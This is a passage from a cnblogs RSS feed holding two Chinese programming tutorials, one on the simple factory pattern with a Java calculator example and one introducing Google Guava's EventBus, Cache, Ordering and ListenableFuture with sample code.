     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 *&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Divide &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Calculate {
     Divide() {
     }
     Divide(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;(num1, num2);
     }
     @Override
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 /&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;继承终于派上用场了，你会发现这样还是没办法使用父类，想要具体的运算还是得直接去实例化子类的对象，和提取父类之前没有什么区别。&lt;/p&gt;

&lt;p&gt;接下来，终于，今天的主题要出场了，简单工厂设计模式。&lt;/p&gt;
&lt;p&gt;先上一个百度百科解释：&lt;/p&gt;
&lt;p&gt;简单工厂模式是属于&lt;span&gt;创建型模式&lt;/span&gt;，又叫做静态工厂方法（Static Factory Method）模式，但不属于23种GOF设计模式之一。简单工厂模式是由一个工厂对象决定创建出哪一种产品类的实例。简单工厂模式是工厂模式家族中最简单实用的模式，可以理解为是不同工厂模式的一个特殊实现。&lt;/p&gt;

&lt;p&gt;简单来说，它就是用来创建对象的，假设有那么一家神秘的工厂，什么都能生产，你只要对它说你想要什么，它就会给你生产出来，你并不需要关心，工厂内部具体是怎么生产的。像这样：&lt;/p&gt;
&lt;div readability=&quot;28&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1532854/201901/1532854-20190109151143480-1768329874.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;当然实际代码中，不能像上面这样天马行空，术业还是要有专攻的，比如一个工厂专门生产各种各样的女朋友，额。。&lt;/p&gt;
&lt;p&gt;比如iphon的工厂专门生产各种型号的ipone。&lt;/p&gt;
&lt;p&gt;把这个思想用到我们的程序中，我们需要一个工厂，接受一个参数，然后它就能返回相应的对象：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CalculateFactory {
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Calculate create(String operate) {
           &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (operate) {
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;+&quot;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Plus();
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;-&quot;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Minus();
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;*&quot;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Multiply();
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;/&quot;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Divide();
           }
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;前面的类都新增了一个默认的构造方法，就是为了这里用，我也思考过，可不可以用统一的带参数构造方法，但我看好像没有人这么写，肯定有它的道理，这里写下自己粗浅的理解，欢迎交流、指正：&lt;/p&gt;
&lt;p&gt;工厂的任务只是生产对象，加上参数就相当于和业务搅在一起，变得很不灵活，今天你只想初始化汽车的品牌，明天你又想初始化汽车的颜色，这样，你汽车类、工厂类、调用工厂的类全要改，如果只是默认的构造方法的话，至少你的工厂类是不用改的。&lt;/p&gt;

&lt;p&gt;接下来看调用的方法：&lt;/p&gt;
&lt;div readability=&quot;11.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Scanner;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Calculator4 {
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
           Scanner scanner &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
           System.out.println(&lt;/span&gt;&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1 =&lt;span&gt; scanner.nextDouble();
           System.out.println(&lt;/span&gt;&quot;请输入一个运算符：+、-、*、/&quot;&lt;span&gt;);
           String operator &lt;/span&gt;= scanner.next();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不能用nextLine()，会把上一个回车给吸收&lt;/span&gt;
           System.out.println(&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num2 =&lt;span&gt; scanner.nextDouble();
           Calculate calculate &lt;/span&gt;=&lt;span&gt; CalculateFactory.create(operator);
           calculate.num1 &lt;/span&gt;=&lt;span&gt; num1;
           calculate.num2 &lt;/span&gt;=&lt;span&gt; num2;
           System.out.println(calculate.calculate());
           scanner.close();
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这回多态也出场了，通过多态，统一用父类接受创建的具体子类，当需要增加运算方式时，只需要修改工厂类和具体的运算类，调用的地方不用变，降低了模块间的耦合性，提高了系统的灵活性。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 09 Jan 2019 07:20:00 +0000</pubDate>
<dc:creator>莫愆</dc:creator>
<og:description>按理说应该把书全都看完一遍，再开始写博客比较科学，会有比较全面的认识。 但是既然都决定要按规律更新博客了，只能看完一个设计模式写一篇了。 也算是逼自己思考了，不是看完就过，至少得把代码自己都敲一遍。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/imoqian/p/10244577.html</dc:identifier>
</item>
<item>
<title>初探Google Guava - 2货我怕谁</title>
<link>http://www.cnblogs.com/jay-wu/p/10244501.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jay-wu/p/10244501.html</guid>
<description>&lt;p&gt;Guava地址：&lt;a href=&quot;https://github.com/google/guava&quot; target=&quot;_blank&quot;&gt;https://github.com/google/guava&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第一次接触我是在16年春github上，当时在找单机查缓存方法，google guava当初取名是因为JAVA的类库不好用，所以谷歌工程师自己开发一套，想着google出品必属精品理念，我们一起来了解一下。&lt;/p&gt;
&lt;p&gt;guava在还没做分布式处理上，单机单整合上大行其道。所以guava在程序性能优化上下了不少的工夫，我们称其为单块架构的利器&lt;/p&gt;
&lt;p&gt;我认为强大的有几点：1.集合处理   2.EventBus消息总线处理  3.guava cache 单机缓存处理  4.并发listenableFutrue回调处理，以下是所有的功能：&lt;/p&gt;
&lt;h2&gt;1. 基本工具 [Basic utilities]&lt;/h2&gt;
&lt;p&gt;让使用Java语言变得更舒适&lt;/p&gt;
&lt;p&gt;1.1 &lt;a href=&quot;http://ifeve.com/using-and-avoiding-null/&quot;&gt;使用和避免null&lt;/a&gt;：null是模棱两可的，会引起令人困惑的错误，有些时候它让人很不舒服。很多Guava工具类用快速失败拒绝null值，而不是盲目地接受&lt;/p&gt;
&lt;p&gt;1.2 &lt;a title=&quot;[Google Guava] 1.2-前置条件&quot; href=&quot;http://ifeve.com/google-guava-preconditions/&quot;&gt;前置条件&lt;/a&gt;: 让方法中的条件检查更简单&lt;/p&gt;
&lt;p&gt;1.3 &lt;a title=&quot;[Google Guava] 常见对象方法：简化Object方法实现，如hashCode()和toString()&quot; href=&quot;http://ifeve.com/google-guava-commonobjectutilities/&quot;&gt;常见Object方法&lt;/a&gt;: 简化Object方法实现，如hashCode()和toString()&lt;/p&gt;
&lt;p&gt;1.4 &lt;a title=&quot;[Google Guava] 排序: Guava强大的”流畅风格比较器”&quot; href=&quot;http://ifeve.com/google-guava-ordering/&quot; target=&quot;_blank&quot;&gt;排序: Guava强大的”流畅风格比较器”&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1.5 &lt;a title=&quot;[Google Guava] Throwables：简化异常和错误的传播与检查&quot; href=&quot;http://ifeve.com/google-guava-throwables/&quot;&gt;Throwables&lt;/a&gt;：简化了异常和错误的传播与检查&lt;/p&gt;
&lt;h2&gt;2. 集合[Collections]&lt;/h2&gt;
&lt;p&gt;Guava对JDK集合的扩展，这是Guava最成熟和为人所知的部分&lt;/p&gt;
&lt;p&gt;2.1 &lt;a title=&quot;[Google Guava] 不可变集合: 防御性编程、常量集合和性能提升&quot; href=&quot;http://ifeve.com/google-guava-immutablecollections/&quot;&gt;不可变集合&lt;/a&gt;: 用不变的集合进行防御性编程和性能提升。&lt;/p&gt;
&lt;p&gt;2.2 &lt;a href=&quot;http://ifeve.com/google-guava-newcollectiontypes/&quot;&gt;新集合类型&lt;/a&gt;: multisets, multimaps, tables, bidirectional maps等&lt;/p&gt;
&lt;p&gt;2.3 &lt;a title=&quot;[Google Guava] 2.3-强大的集合工具类：java.util.Collections中未包含的集合工具&quot; href=&quot;http://ifeve.com/google-guava-collectionutilities/&quot; target=&quot;_blank&quot;&gt;强大的集合工具类&lt;/a&gt;: 提供java.util.Collections中没有的集合工具&lt;/p&gt;
&lt;p&gt;2.4 &lt;a title=&quot;[Google Guava] 2.4-集合扩展工具类&quot; href=&quot;http://ifeve.com/google-guava-collectionhelpersexplained/&quot; target=&quot;_blank&quot;&gt;扩展工具类&lt;/a&gt;：让实现和扩展集合类变得更容易，比如创建&lt;tt&gt;Collection的装饰器，或实现迭代器&lt;/tt&gt;&lt;/p&gt;

&lt;p&gt;Guava Cache：本地缓存实现，支持多种缓存过期策略&lt;/p&gt;

&lt;p&gt;Guava的函数式支持可以显著简化代码，但请谨慎使用它&lt;/p&gt;
&lt;h2&gt;5. 并发[Concurrency]&lt;/h2&gt;
&lt;p&gt;强大而简单的抽象，让编写正确的并发代码更简单&lt;/p&gt;
&lt;p&gt;5.1 &lt;a title=&quot;google Guava包的ListenableFuture解析&quot; href=&quot;http://ifeve.com/google-guava-listenablefuture/&quot; target=&quot;_blank&quot;&gt;ListenableFuture&lt;/a&gt;：完成后触发回调的Future&lt;/p&gt;
&lt;p&gt;5.2 &lt;a title=&quot;Google-Guava Concurrent包里的Service框架浅析&quot; href=&quot;http://ifeve.com/google-guava-serviceexplained/&quot; target=&quot;_blank&quot;&gt;Service框架&lt;/a&gt;：抽象可开启和关闭的服务，帮助你维护服务的状态逻辑&lt;/p&gt;

&lt;p&gt;非常有用的字符串工具，包括分割、连接、填充等操作&lt;/p&gt;

&lt;p&gt;扩展 JDK 未提供的原生类型（如int、char）操作， 包括某些类型的无符号形式&lt;/p&gt;

&lt;p&gt;可比较类型的区间API，包括连续和离散类型&lt;/p&gt;

&lt;p&gt;简化I/O尤其是I/O流和文件的操作，针对Java5和6版本&lt;/p&gt;

&lt;p&gt;提供比&lt;tt&gt;Object.hashCode()&lt;/tt&gt;更复杂的散列实现，并提供布鲁姆过滤器的实现&lt;/p&gt;

&lt;p&gt;发布-订阅模式的组件通信，但组件不需要显式地注册到其他组件中&lt;/p&gt;

&lt;p&gt;优化的、充分测试的数学工具类&lt;/p&gt;
&lt;h2&gt;13. &lt;a title=&quot;google Guava包的reflection解析&quot; href=&quot;http://ifeve.com/guava-reflection/&quot; target=&quot;_blank&quot;&gt;反射&lt;/a&gt;[Reflection]&lt;/h2&gt;
&lt;p&gt;Guava 的 Java 反射机制工具类&lt;/p&gt;

&lt;p&gt;1.Guava EventBus探讨&lt;/p&gt;
&lt;p&gt;在设计模式中， 有一种叫做发布/订阅模式， 即某事件被发布， 订阅该事件的角色将自动更新。&lt;br/&gt;那么订阅者和发布者直接耦合， 也就是说在发布者内要通知订阅者说我这边有东西发布了， 你收一下。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
Observable.just(1).subscribe(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Subsriber(){

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; onCompleted() {
    System.out.println(&lt;/span&gt;&quot;onCompleted &quot;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; onError(Throwable arg0) {
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; onNext(Long arg0) {
        System.out.println(&lt;/span&gt;&quot;onNext &quot; +&lt;span&gt; arg0);
    }
})

我们可以看到， 发布者发布一个数字1， 订阅者订阅了这个
&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而加入eventBus， 发布者与生产者之间的耦合性就降低了。因为这时候我们去管理eventbus就可以， 发布者只要向eventbus发送信息就可以， 而不需要关心有多少订阅者订阅了此消息。模型如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1531118/201901/1531118-20190109135126933-2085899579.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;div readability=&quot;19&quot;&gt;
&lt;div readability=&quot;16&quot;&gt;
&lt;h2&gt;为什么说eventBus 是单块架构的利器呢？&lt;/h2&gt;
&lt;p&gt;首先单块架构就是在一个进程内， 在一个进程内， 我们还是希望模块与模块之间（功能与功能之间）是松耦合的，而在一个模块中是高度内聚的， 如何降低一定的耦合， 使得代码更加有结构， guava eventbus就是支持进程内通讯的桥梁。&lt;/p&gt;
&lt;h3&gt;想象一下以下业务&lt;/h3&gt;
&lt;p&gt;我们希望在数据到来之后， 进行入库， 同时能够对数据进行报警预测， 当发生报警了， 能够有以下几个动作， 向手机端发送推送， 向web端发送推送， 向手机端发送短信。&lt;/p&gt;
&lt;p&gt;在一般情况下我们可以这样实现： （伪代码如下）&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
processData(data){
    insertintoDB(data); //执行入库操作
    predictWarning(data);   // 执行报警预测
}
在predictWarning(data)中{
    if(data reaches warning line){
        sendNotification2App(data); //向手机端发送推送
        sendNotification2Web(data); // 向web端发送推送
        sendSMS2APP(data);      //手机端发送短信
    }
}
在这里我不去讲具体是如何向web端发送推送， 如何发送短信。主要用到第三方平台
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;分析&lt;/h3&gt;
&lt;p&gt;入库和报警预测是没有直接联系，或者是不分先后顺序的， 同样在报警模块中， 向3个客户端发送信息也应该是没有联系的， 所以以上虽然可以实现功能， 但不符合代码的合理性。&lt;/p&gt;
&lt;p&gt;应该是怎么样的逻辑呢？ 如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1531118/201901/1531118-20190109135303130-1920006944.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;/div&gt;

&lt;div readability=&quot;66.233404142326&quot;&gt;
&lt;div readability=&quot;14&quot;&gt;
&lt;p&gt;当数据事件触发， 发布到data EventBus 上， 入库和预警分别订阅这个eventBus, 就会触发这两个事件， 而在预警事件中， 将事件发送到warning EventBus 中， 由下列3个订阅的客户端进行发送消息。&lt;/p&gt;
&lt;h3&gt;如何实现&lt;/h3&gt;
&lt;p&gt;先来讲同步， 即订阅者收到事件后依次执行, 下面都是伪代码， 具体的入库细节等我在这里不提供。&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
@Component
public class DataHandler{
    
    @Subscribe
    public void handleDataPersisist(Data data){
        daoImpl.insertData2Mysql(data);
    }
    
    @Subscribe
    public void predictWarning(Data data){
        if(data is warning){ // pseudo code  如果预警
            Warning warning = createWarningEvent(data);  // 根据data创建一个Warning事件
            postWarningEvent(warning)
        }
    }
    
    protected postWarningEvent(Warning warning){
        EventBusManager.warningEventBus.post(warning);// 发布到warning event 上
    }
    
    @PostConstruct   // 由spring 在初始化bean后执行
    public void init(){
        register2DataEventBus();
    }
    
    // 将自己注册到eventBus中
    protected void register2DataEventBus(){
        EventBusManager.dataEventBus.register(this);
    }
    
}

@Component
public class WarningHandler{
    @Subscribe
    public void sendNotification2AppClient(Warning warning){
        JpushUtils.sendNotification(warning);
    }
    @Subscribe
    public void sendSMS(Warning warning){
        SMSUtils.sendSMS(warning);
    }
    @Subscribe
    public void send2WebUsingWebSocket(Warning warning){
        WebsocketUtils.sendWarning(warning);
    }
    
    @PostConstruct   // 由spring 在初始化bean后执行
    public void init(){
        register2WarningEventBus();
    }
    
    // 将自己注册到eventBus中
    protected void register2DataEventBus(){
        EventBusManager.warningEventBus.register(this);
    }
}


/**
 * 管理所有的eventBus
 **/
public class EventBusManager{
    public final static EventBus dataEventBus = new EventBus();
    public final static EventBus warningEventBus = new EventBus();
    
}



简化
// 我们发现每一个Handler都要进行注册，
public abstract class BaseEventBusHandler{
    
    @PostConstruct
    public void init(){
        register2EventBus();
    }
    private void register2EventBus(){
        getEventBus().register(this);
    }
    protected abstract EventBus getEventBus();
}
这样在写自己的eventBus只需要

@Component
public class MyEventBus extends BaseEventBusHandler{
    @Override
    protected abstract EventBus getEventBus(){
        retrun EventBusManager.myEventBus;
    }
}

在目前的应用场景下， 同步是我们不希望的， 异步场景也很容易实现。
只需要将EventBus 改成
 AsyncEventBus warningEvent = new AsyncEventBus(Executors.newFixedThreadPool(1))
 AsyncEventBus dataEventBus = new AsyncEventBus(Executors.newFixedThreadPool(3))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;2.集合处理&lt;/p&gt;
&lt;p&gt;1.optional空值比较&lt;/p&gt;
&lt;p&gt;2.集合排序guava&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;38&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot; readability=&quot;5&quot;&gt;
    Integer[] inumber={55,22,33};
        System.out.println(new Ordering&amp;lt;Integer&amp;gt;(){
            @Override
            public int compare(Integer left, Integer right) {
                return left-right;
            }
        }.sortedCopy(Arrays.asList(inumber)));&lt;p&gt;//java 需要自定义compare
&lt;/p&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;3.guava cache 缓存触发机制&lt;/p&gt;
&lt;p&gt;业务场景，当某一个文件保留的有效期30分钟后删除；某一个文件容易超过一定限定。&lt;/p&gt;
&lt;h2&gt;基于容量的回收:&lt;/h2&gt;
&lt;p&gt;规定缓存项的数目不超过固定值，只需使用CacheBuilder.maximumSize(long)。缓存将尝试回收最近没有使用或总体上很少使用的缓存项。——&lt;em&gt;警告&lt;/em&gt;：在缓存项的数目达到限定值之前，即缓存项的数目逼近限定值时缓存就可能进行回收操作。这个size指的是cache中的条目数，不是内存大小或是其他.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GuavaCacheTest {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        Cache&lt;/span&gt;&amp;lt;Integer, String&amp;gt; cache = CacheBuilder.newBuilder().maximumSize(2&lt;span&gt;).build();
        cache.put(&lt;/span&gt;1, &quot;a&quot;&lt;span&gt;);
        cache.put(&lt;/span&gt;2, &quot;b&quot;&lt;span&gt;);
        cache.put(&lt;/span&gt;3, &quot;c&quot;&lt;span&gt;);
        System.out.println(cache.asMap());
        System.out.println(cache.getIfPresent(&lt;/span&gt;2&lt;span&gt;));
        cache.put(&lt;/span&gt;4, &quot;d&quot;&lt;span&gt;);
        System.out.println(cache.asMap());
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1531118/201901/1531118-20190109150145636-655226683.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;基于时间的回收&lt;/h2&gt;
&lt;div readability=&quot;15.5&quot;&gt;
&lt;div readability=&quot;23.5&quot;&gt;
&lt;p&gt;guava 提供两种定时回收的方法&lt;/p&gt;
&lt;p&gt;expireAfterAccess(long, TimeUnit):缓存项在给定时间内没有被读/写访问，则回收。请注意这种缓存的回收顺序和基于大小回收一样。&lt;/p&gt;
&lt;p&gt;expireAfterWrite(long, TimeUnit):缓存项在给定时间内没有被写访问（创建或覆盖），则回收。如果认为缓存数据总是在固定时候后变得陈旧不可用，这种回收方式是可取的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GuavaCacheTest {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        LoadingCache&lt;/span&gt;&amp;lt;Integer, Integer&amp;gt; cache = CacheBuilder.newBuilder().expireAfterWrite(3, TimeUnit.SECONDS).removalListener(&lt;span&gt;new&lt;/span&gt; RemovalListener&amp;lt;Object, Object&amp;gt;&lt;span&gt;() {
            @Override
            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; onRemoval(RemovalNotification&amp;lt;Object, Object&amp;gt;&lt;span&gt; notification) {
                System.out.println(&lt;/span&gt;&quot;remove key[&quot; + notification.getKey() + &quot;],value[&quot; + notification.getValue() + &quot;],remove reason[&quot; + notification.getCause() + &quot;]&quot;&lt;span&gt;);
            }
        }).recordStats().build(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; CacheLoader&amp;lt;Integer, Integer&amp;gt;&lt;span&gt;() {
                    @Override
                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Integer load(Integer key) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 2&lt;span&gt;;
                    }
                }
        );
        cache.put(&lt;/span&gt;1, 1&lt;span&gt;);
        cache.put(&lt;/span&gt;2, 2&lt;span&gt;);
        System.out.println(cache.asMap());
        cache.invalidateAll();
        System.out.println(cache.asMap());
        cache.put(&lt;/span&gt;3, 3&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            System.out.println(cache.getUnchecked(&lt;/span&gt;3&lt;span&gt;));
            Thread.sleep(&lt;/span&gt;4000&lt;span&gt;);
            System.out.println(cache.getUnchecked(&lt;/span&gt;3&lt;span&gt;));
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
            e.printStackTrace();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1531118/201901/1531118-20190109150250588-1974239741.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;hljs xml&quot;&gt;
&lt;code class=&quot;xml&quot;&gt;Cache&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Integer, &lt;span class=&quot;hljs-attr&quot;&gt;Integer&amp;gt; cache = CacheBuilder.newBuilder().maximumSize(100).expireAfterAccess(3, TimeUnit.SECONDS).build();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 4.ListenableFuture 异步回调通知&lt;/p&gt;
&lt;p&gt;传统JDK中的Future通过异步的方式计算返回结果:在多线程运算中可能或者可能在没有结束返回结果，Future是运行中的多线程的一个引用句柄，确保在服务执行返回一个Result。&lt;/p&gt;
&lt;p&gt;&lt;tt&gt;ListenableFuture可以允许你注册回调方法(&lt;/tt&gt;callbacks)，在运算（多线程执行）完成的时候进行调用,  或者在运算（多线程执行）完成后立即执行。这样简单的改进，使得可以明显的支持更多的操作，这样的功能在JDK concurrent中的Future是不支持的。&lt;/p&gt;
&lt;p&gt;&lt;tt&gt;ListenableFuture&lt;/tt&gt; 中的基础方法是&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/ListenableFuture.html#addListener(java.lang.Runnable,%20java.util.concurrent.Executor)&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;addListener(Runnable, Executor)&lt;/tt&gt;&lt;/a&gt;, 该方法会在多线程运算完的时候，指定的Runnable参数传入的对象会被指定的Executor执行。&lt;/p&gt;

&lt;p&gt;多数用户喜欢使用 &lt;tt&gt;&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/Futures.html#addCallback(com.google.common.util.concurrent.ListenableFuture,%20com.google.common.util.concurrent.FutureCallback,%20java.util.concurrent.Executor)&quot; rel=&quot;nofollow&quot;&gt;Futures.addCallback(ListenableFuture&amp;lt;V&amp;gt;, FutureCallback&amp;lt;V&amp;gt;, Executor)&lt;/a&gt;的方式&lt;/tt&gt;, 或者 另外一个版本&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/Futures.html#addCallback(com.google.common.util.concurrent.ListenableFuture,%20com.google.common.util.concurrent.FutureCallback)&quot; rel=&quot;nofollow&quot;&gt;version&lt;/a&gt;（译者注：&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/src-html/com/google/common/util/concurrent/Futures.html#line.1106&quot;&gt;addCallback&lt;/a&gt;(&lt;a title=&quot;interface in com.google.common.util.concurrent&quot; href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/ListenableFuture.html&quot;&gt;ListenableFuture&lt;/a&gt;&amp;lt;V&amp;gt; future,&lt;a title=&quot;interface in com.google.common.util.concurrent&quot; href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/FutureCallback.html&quot;&gt;FutureCallback&lt;/a&gt;&amp;lt;? super V&amp;gt; callback)），默认是采用 &lt;tt&gt;MoreExecutors.sameThreadExecutor()线程池&lt;/tt&gt;, 为了简化使用，Callback采用轻量级的设计.  &lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/FutureCallback.html&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;FutureCallback&amp;lt;V&amp;gt;&lt;/tt&gt;&lt;/a&gt; 中实现了两个方法:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/FutureCallback.html#onSuccess(V)&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;onSuccess(V)&lt;/tt&gt;&lt;/a&gt;,在Future成功的时候执行，根据Future结果来判断。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/FutureCallback.html#onFailure(java.lang.Throwable)&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;onFailure(Throwable)&lt;/tt&gt;&lt;/a&gt;, 在Future失败的时候执行，根据Future结果来判断。&lt;/li&gt;
&lt;/ul&gt;
